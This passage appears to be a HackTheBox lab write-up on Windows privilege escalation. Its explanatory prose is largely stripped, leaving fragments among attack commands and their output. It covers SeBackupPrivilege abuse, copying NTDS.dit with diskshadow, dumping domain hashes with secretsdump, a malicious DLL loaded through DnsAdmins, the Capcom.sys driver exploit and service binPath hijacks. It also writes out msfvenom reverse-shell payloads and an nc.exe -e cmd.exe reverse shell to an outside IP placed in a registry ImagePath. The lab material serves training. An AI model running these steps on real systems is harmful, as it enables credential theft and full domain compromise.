06/18/2021  12:22 PM    &lt;DIR&gt;          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free</code></pre>
<p>Takeown Windows</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student</code></pre>
<ol><li>ACL</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin
 
root:n1X_p0wer_us3er!</code></pre>
<pre><code class="language-shell-session">c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav</code></pre>
<h2>Windows Group Privileges</h2>
<p><strong>Windows Built-in</strong></p>
<div class="post-table-wrap"><table><thead><tr><th>Backup Operators</th><th>Event Log Readers</th><th>DnsAdmins DNS</th></tr></thead><tbody><tr><td>Hyper-V Administrators Hyper-V</td><td>Print Operators</td><td>Server Operators</td></tr></tbody></table></div>
<h3>Backup Operators</h3>
<pre><code class="language-cmd">whoami /groups SeBackup SeRestore SeBackupPrivilege ACL ACE FILE_FLAG_BACKUP_SEMANTICS</code></pre>
<p>PoC <code>SeBackupPrivilege</code> PowerShell</p>
<ol><li>Importing Libraries</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll</code></pre>
<p><code> SeBackupPrivilege</code> <code>whoami /priv</code> <code>Get-SeBackupPrivilege</code> cmdlet <code>Set-SeBackupPrivilege</code></p>
<pre><code class="language-powershell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-SeBackupPrivilege

SeBackupPrivilege is disabled</code></pre>
<pre><code class="language-powershell">Set-SeBackupPrivilege</code></pre>
<ol><li>Enabling SeBackupPrivilege</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; Set-SeBackupPrivilege
PS C:\htb&gt; Get-SeBackupPrivilege

SeBackupPrivilege is enabled</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</code></pre>
<ol><li>Copying a Protected File</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt


PS C:\htb&gt; cat 'C:\Confidential\2021 Contract.txt'

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
At line:1 char:1
+ cat 'C:\Confidential\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
   izedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt

Copied 88 bytes


PS C:\htb&gt;  cat .\Contract.txt

Inlanefreight 2021 Contract

==============================

Board of Directors:

&lt;...SNIP...&gt;</code></pre>
<p><strong> DC - Copying NTDS.dit</strong></p>
<p><code>NTDS.dit</code> Windows diskshadow <code>C</code> <code>E</code> NTDS.dit</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW&gt; set verbose on
DISKSHADOW&gt; set metadata C:\Windows\Temp\meta.cab
DISKSHADOW&gt; set context clientaccessible
DISKSHADOW&gt; set context persistent
DISKSHADOW&gt; begin backup
DISKSHADOW&gt; add volume C: alias cdrive
DISKSHADOW&gt; create
DISKSHADOW&gt; expose %cdrive% E:
DISKSHADOW&gt; end backup
DISKSHADOW&gt; exit

PS C:\htb&gt; dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows</code></pre>
<pre><code class="language-cmd">Copy-FileSeBackupPrivilege cmdlet ACL NTDS.dit</code></pre>
<ol><li>Copying NTDS.dit Locally</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

Copied 16777216 bytes</code></pre>
<p>&gt;SYSTEM Registry Hives: Windows <strong>Registry </strong></p>
<ol><li>SAM SYSTEM Registry Hives</li></ol>
<p>SAM SYSTEM Registry Hives Impacket's <code>secretsdump.py</code></p>
<pre><code class="language-cmd-session">C:\htb&gt; reg save HKLM\SYSTEM SYSTEM.SAV

The operation completed successfully.


C:\htb&gt; reg save HKLM\SAM SAM.SAV

The operation completed successfully.</code></pre>
<p>NTDS.dit <code>secretsdump.py</code> PowerShell <code>DSInternals</code> Active Directory <code>DSInternals</code> <code> </code> NTLM</p>
<ol><li>NTDS.dit</li></ol>
<pre><code class="language-powershell-session">PS C:\htb&gt; Import-Module .\DSInternals.psd1
PS C:\htb&gt; $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb&gt; Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

DistinguishedName: CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
Sid: S-1-5-21-669053619-2741956077-1013132368-500
Guid: f28ab72b-9b16-4b52-9f63-ef4ea96de215
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName:
PrimaryGroupId: 513
SidHistory:
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False
LastLogonDate: 5/6/2021 5:40:30 PM
DisplayName:
GivenName:
Surname:
Description: Built-in account for administering the computer/domain
ServicePrincipalName:
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited,
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-669053619-2741956077-1013132368-512
Secrets
  NTHash: cf3a5525ee9414229e66279623ed5c58
  LMHash:
  NTHashHistory:
  LMHashHistory:
  SupplementalCredentials:
    ClearText:
    NTLMStrongHash: 7790d8406b55c380f98b92bb2fdc63a7
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: d60dfbbf20548938
      OldCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 94c300d0e47775b407f2496a5cca1a0a
          Iterations: 4096
        DES_CBC_MD5
          Key: d60dfbbf20548938
          Iterations: 4096
      OldCredentials:
      OlderCredentials:
      ServiceCredentials:
      Salt: WIN-NB4NGP3TKNKAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
Key Credentials:
Credential Roaming
  Created:
  Modified:
  Credentials:</code></pre>
<ol><li>SecretsDump</li></ol>
<pre><code class="language-shell-session">henduoduo@htb[/htb]$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xc0a9116f907bd37afaaa845cb87d0550
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 85541c20c346e3198a3ae2c09df7f330
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINLPE-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7abf052dcef31f6305f1d4c84dfa7484:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a05824b8c279f2eb31495a012473d129:::
htb-student:1103:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
bob:1105:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
hyperv_adm:1106:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
printsvc:1107:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::

&lt;SNIP&gt;</code></pre>
<p><strong>Robocopy</strong> Robocopy</p>
<pre><code class="language-cmd-session">C:\htb&gt; robocopy /B E:\Windows\NTDS .\ntds ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, May 6, 2021 1:11:47 PM
   Source : E:\Windows\NTDS\
     Dest : C:\Tools\ntds\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

          New Dir          1    E:\Windows\NTDS\
100%        New File              16.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           356962042 Bytes/sec.
   Speed :           20425.531 MegaBytes/min.
   Ended : Thursday, May 6, 2021 1:11:47 PM</code></pre>
<h3>Event Log Readers</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-process-creation" target="_blank" rel="noreferrer"></a> ID 4688 Windows <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688" target="_blank" rel="noreferrer"></a> SIEM ElasticSearch <code>whoami</code> <code>netstat</code> <code> </code></p>
<p>Windows <strong>4688 = A new process has been created </strong></p>
<ul><li>cmd.exe</li><li>powershell</li><li>whoami</li><li>exe</li></ul>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\" target="_blank" rel="noreferrer"></a>?redirectedfrom=MSDN#event-log-readers)</p>
<p><strong> group </strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.</code></pre>
<p>Microsoft Windows <a href="https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf" target="_blank" rel="noreferrer"></a> Windows</p>
<p>wevtutil Get-WinEvent PowerShell Windows</p>
<p><strong> wevtutil </strong></p>
<pre><code class="language-powershell-session">PS C:\htb&gt; wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
<p><strong>Passing Credentials to wevtutil</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"</code></pre>
<blockquote><code>Get-WInEvent</code> <code> </code> <code>HKLM\System\CurrentControlSet\Services\Eventlog\Security</code> <code> </code></blockquote>
<pre><code class="language-powershell">Get-WinEvent</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword</code></pre>
<pre><code class="language-powershell">PowerShell</code></pre>
<h3>DnsAdmins</h3>
<p>DnsAdmins DNS Windows DNS DNS DNS <code>NT AUTHORITY\SYSTEM</code> DNS dnscmd DLL <a href="https://adsecurity.org/?p=4064" target="_blank" rel="noreferrer"></a> DNS</p>
<p>DNS RPC</p>
<p>ServerLevelPluginDll DLL DLL <code>dnscmd</code></p>
<p><code>DnsAdmins</code> <code>dnscmd</code> <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code></p>
<ul><li>DNS management is performed over RPC</li><li>ServerLevelPluginDll allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the <code>dnscmd</code> tool from the command line</li><li>When a member of the <code>DnsAdmins</code> group runs the <code>dnscmd</code> command below, the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll</code> registry key is populated</li><li>When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)</li><li>An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.</li></ul>
<p><strong> DnsAdmins , Leveraging DnsAdmins Access</strong></p>
<p>DLL <code>msfvenom</code> <code>domain admins</code></p>
<ol><li>DLL</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll</code></pre>
<pre><code class="language-shell">Python HTTP</code></pre>
<ol><li>HTTP</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ python3 -m http.server 7777

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt;  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"</code></pre>
<p>We open a listener with msfconsole using this:</p>
<pre><code>msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST IP; set LPORT 4242; run"</code></pre>
<ol><li>dll</li></ol>
<pre><code>dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\reverseshell.dll</code></pre>
<p>Press enter or click to view image in full size</p>
<img src="https://miro.medium.com/v2/resize:fit:1050/1*SlaFH6tJgHJ8x4WtofXHwQ.png" alt="Referenced image" />
<ol><li>cmd DNS</li></ol>
<pre><code class="language-cmd">sc stop dns
sc start dns</code></pre>
<img src="https://miro.medium.com/v2/resize:fit:971/1*xZ847WY3IpPi1az0fgofwA.png" alt="Referenced image" />
<p>We then get a reverse shell simultaniously:</p>
<p>Press enter or click to view image in full size</p>
<img src="https://miro.medium.com/v2/resize:fit:1050/1*oWFADwnorLf_xkRH5N1OVw.png" alt="Referenced image" />
<p>now you can get the flag on:</p>
<pre><code class="language-cmd">c:\Users\Administrator\Desktop\DnsAdmins\flag.txt</code></pre>
<h3>Print Operators</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators" target="_blank" rel="noreferrer"></a> <code>SeLoadDriverPrivilege</code> <code>whoami /priv</code> <code>SeLoadDriverPrivilege</code> (UAC)</p>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled</code></pre>
<p><code>Capcom.sys</code> SYSTEM shellcode <a href="https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp" target="_blank" rel="noreferrer"></a> PoC</p>
<pre><code class="language-c">#include &lt;windows.h&gt;
#include &lt;assert.h&gt;
#include &lt;winternl.h&gt;
#include &lt;sddl.h&gt;
#include &lt;stdio.h&gt;
#include "tchar.h"</code></pre>
<p><strong> cl.exe </strong></p>
<pre><code class="language-cmd-session">C:\Users\mrb3n\Desktop\Print Operators&gt;cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj</code></pre>
<p><code>Capcom.sys</code> <a href="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" target="_blank" rel="noreferrer"></a> <code>C:\temp</code> HKEY_CURRENT_USER</p>
<pre><code class="language-cmd-session">C:\htb&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\htb&gt; reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.</code></pre>
<p><code>\??\</code> NT Win32 API</p>
<p>Nirsoft DriverView.exe Capcom.sys</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; .\DriverView.exe /stext drivers.txt
PS C:\htb&gt; cat drivers.txt | Select-String -pattern Capcom</code></pre>
<p><code>EnableSeLoadDriverPrivilege.exe</code></p>
<pre><code class="language-cmd-session">C:\htb&gt; EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0</code></pre>
<pre><code class="language-powershell-session">PS C:\htb&gt; .\DriverView.exe /stext drivers.txt
PS C:\htb&gt; cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys</code></pre>
<p><strong> ExploitCapcom </strong> Capcom.sys Visual Studio ExploitCapcom</p>
<pre><code class="language-powershell-session">PS C:\htb&gt; .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched</code></pre>
<p>SYSTEM shell</p>
<img src="assets/posts/windows-privilege-escalation/Pasted image 20260228081647.png" alt="Pasted image 20260228081647" />
<p><code>ExploitCapcom.cpp</code> 292 <code>"C:\\Windows\\system32\\cmd.exe"</code> <code>reverse shell binary</code> shell <code>msfvenom</code><code>c:\ProgramData\revshell.exe</code></p>
<pre><code class="language-c">// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &amp;StartupInfo,
        &amp;ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}</code></pre>
<p><code>CommandLine</code></p>
<pre><code class="language-c"> TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");</code></pre>
<p>EopLoadDriver EoPLoadDriver <code>NTLoadDriver</code></p>
<pre><code class="language-cmd-session">C:\htb&gt; EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0</code></pre>
<p><code>ExploitCapcom.exe</code> SYSTEM shell</p>
<pre><code class="language-cmd-session">C:\htb&gt; reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.</code></pre>
<h3>Server Operators</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators" target="_blank" rel="noreferrer"></a> Windows <code>SeBackupPrivilege</code> <code>SeRestorePrivilege</code></p>
<ol><li>AppReadiness</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; sc qc AppReadiness

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: AppReadiness
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : App Readiness
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem</code></pre>
<ol><li>PsService</li></ol>
<pre><code class="language-cmd-session">C:\htb&gt; c:\Tools\PsService.exe security AppReadiness

PsService v2.25 - Service information and configuration utility
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

SERVICE_NAME: AppReadiness
DISPLAY_NAME: App Readiness
        ACCOUNT: LocalSystem
        SECURITY:
        [ALLOW] NT AUTHORITY\SYSTEM
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                Pause/Resume
                Start
                Stop
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Administrators
                All
        [ALLOW] NT AUTHORITY\INTERACTIVE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] NT AUTHORITY\SERVICE
                Query status
                Query Config
                Interrogate
                Enumerate Dependents
                User-Defined Control
                Read Permissions
        [ALLOW] BUILTIN\Server Operators
                All</code></pre>
<p>SERVICE_ALL_ACCESS</p>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; sc start AppReadiness

[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.</code></pre>
<blockquote>“ ” <code>binPath</code> “ ” <strong> <code>binPath</code> </strong></blockquote>
<pre><code class="language-cmd-session">C:\htb&gt; net localgroup Administrators

Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
server_adm
The command completed successfully.</code></pre>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ crackmapexec smb 10.129.29.67 -u server_adm -p 'HTB_@cademy_stdnt!'

SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)</code></pre>
<ol><li>NTLM</li></ol>
<pre><code class="language-shell-session">Chenduoduo@htb[/htb]$ impacket-secretsdump server_adm@10.129.29.67 -just-dc-user administrator

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
Administrator:des-cbc-md5:d60dfbbf20548938
[*] Cleaning up...</code></pre>
<h2>Attacking the OS</h2>
<h3>User Account Control</h3>
<ol><li><strong>UAC </strong> Windows</li></ol>
<ul><li><strong> </strong></li><li><strong> </strong></li><li><strong> Standard User </strong></li><li><strong> </strong></li><li><strong> </strong></li></ul>
<blockquote>UAC not a security boundary</blockquote>
<blockquote><strong>UAC Bypass</strong></blockquote>
<h3>Weak Permissions</h3>
<ol><li>-&gt; exe</li><li>-&gt; <code>binpath</code></li><li>-&gt; exe</li><li>-&gt; <code>ImagePath</code></li></ol>
<p>****</p>
<ol><li>Permissive File System ACLs</li></ol>
<pre><code>SharpUp.exe audit</code></pre>
<p><strong>② ACL</strong> <code>Users</code> <code>Everyone</code> <strong> / Full Control</strong></p>
<pre><code>icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
<pre><code>msfvenom -p windows/shell_reverse_tcp -f exe &gt; SecurityService.exe</code></pre>
<pre><code>copy SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"</code></pre>
<pre><code>sc start SecurityService</code></pre>
<hr />
<ol><li>Weak Service Permissions</li></ol>
<pre><code>SharpUp.exe audit</code></pre>
<p><strong>② </strong> <strong>SERVICE_ALL_ACCESS</strong></p>
<pre><code>accesschk.exe /accepteula -quvcw WindscribeService</code></pre>
<pre><code>sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"</code></pre>
<pre><code>sc stop WindscribeService</code></pre>
<pre><code>sc start WindscribeService</code></pre>
<p>****</p>
<ol><li>Unquoted Service Path</li></ol>
<pre><code class="language-cmd">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """</code></pre>
<pre><code class="language-cmd">sc qc SystemExplorerHelpService</code></pre>
<pre><code class="language-cmd">C:\Program.exe</code></pre>
<hr />
<ol><li>Permissive Registry ACLs</li></ol>
<p>accesschk.exe /accepteula "username" -kvuqsw hklm\System\CurrentControlSet\services</p>
<pre><code class="language-powershell">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name ImagePath -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"</code></pre>
<pre><code class="language-cmd">sc start ModelManagerService</code></pre>
<hr />
